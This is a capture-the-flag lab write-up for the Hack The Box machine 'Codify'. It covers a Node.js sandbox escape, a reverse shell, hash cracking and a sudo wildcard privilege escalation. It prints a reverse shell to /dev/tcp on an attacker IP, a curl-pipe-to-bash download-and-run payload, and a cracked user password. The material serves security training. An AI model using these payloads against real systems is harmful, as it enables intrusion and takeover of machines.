---
icon: ubuntu
---

# Codify - Easy

<figure><img src="../../.gitbook/assets/image (1711).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/codify"><strong>Codify</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```bash
# Nmap TCP
nmap -A -T4 -p- -Pn 10.10.11.239 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-20 15:28 EDT
Nmap scan report for 10.10.11.239
Host is up (0.028s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://codify.htb/
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   90.47 ms 10.10.16.1
2   26.27 ms 10.10.11.239
```

Nmap reveals the redirect on port 80 HTTP, I will add it to my `/etc/hosts` file

```
10.10.11.239 	codify.htb
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2713).png" alt=""><figcaption></figcaption></figure>

This website is a Node.js sandbox environment

<figure><img src="../../.gitbook/assets/image (2714).png" alt=""><figcaption></figcaption></figure>

We can see the limitations set by the creator. If we try to use any of these methods to try an achieve RCE we will get an error message&#x20;

<figure><img src="../../.gitbook/assets/image (2715).png" alt=""><figcaption></figcaption></figure>

`child_process` is an outdated module, however the module `node:child_process` is more efficient and it works!

<figure><img src="../../.gitbook/assets/image (2716).png" alt=""><figcaption></figcaption></figure>

Let's see if it can reach out to us

<figure><img src="../../.gitbook/assets/image (2717).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2718).png" alt=""><figcaption></figcaption></figure>

It does we now have RCE, let's achieve a reverse shell

I am going to have a bash script prepared, and save it as reverse.sh

```bash
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.16.7/3000 0>&1'
```

Now to download the script on the target machine and run it

{% code title="Sandbox Code" %}
```javascript
const { spawn } = require('node:child_process');
spawn('bash', ['-c','curl http://10.10.16.7/reverse.sh | bash'],{'detached':true});
```
{% endcode %}

Make sure you have a listener ready on port 3000 and a python webserver on port 80.

<figure><img src="../../.gitbook/assets/image (2719).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2720).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Manual Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (2708).png" alt=""><figcaption></figcaption></figure>

Besides root and svc there is another user on this machine. I'll check and see if I can find any credentials for him

### <mark style="color:$primary;">Database file leads to Credentials</mark>

<figure><img src="../../.gitbook/assets/image (2721).png" alt=""><figcaption></figcaption></figure>

Found an interesting db file in `/var/www/contact` I am going to transfer it to my machine and check it out

I am going to open the file in SQLiteBrowser

<figure><img src="../../.gitbook/assets/image (2709).png" alt=""><figcaption></figcaption></figure>

After loading the file If you go to browse Data and select the users table we found joshua hash. I am going to try and crack it

### <mark style="color:$primary;">Cracking Hash</mark>

```bash
john joshua_hash -w=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (2710).png" alt=""><figcaption></figcaption></figure>

```
joshua:spongebob1
```

With these creds we can ssh

```bash
ssh joshua@codify.htb
```

<figure><img src="../../.gitbook/assets/image (2711).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Sudo Script leads to Wildcard Exploit</mark>

Let's take a look at the bash script

```bash
#!/bin/bash                                                                                                                                         
DB_USER="root"                                                                                                                                      
DB_PASS=$(/usr/bin/cat /root/.creds)                                                                                                                
BACKUP_DIR="/var/backups/mysql"                                                                                                                     
                                                                                                                                                    
read -s -p "Enter MySQL password for $DB_USER: " USER_PASS                                                                                          
/usr/bin/echo                                                                                                                                       
                                                                                                                                                    
if [[ $DB_PASS == $USER_PASS ]]; then                                                                                                               
        /usr/bin/echo "Password confirmed!"                                                                                                         
else                                                                                                                                                
        /usr/bin/echo "Password confirmation failed!"                                                                                               
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!
```

This script has a major vulnerability. During testing I discovered this line

```bash
if [[$DB_PASS == $USER_PASS]]
```

This expression `if [[ "$password" == * ]]` This will **always be&#x20;**<mark style="color:$success;">**TRUE**</mark> **because** `*` is a glob pattern that matches **any string**, including an empty string.&#x20;

What is really funny is that this only works if you use double \[ if you use a single one this would not work

Now to exploit it we will make use of [**pspy**](https://github.com/DominicBreuker/pspy/releases)**.** Have pspy running in one terminal and in another run the script as follows and enter `*` for the root user's password

<figure><img src="../../.gitbook/assets/image (2712).png" alt=""><figcaption></figcaption></figure>
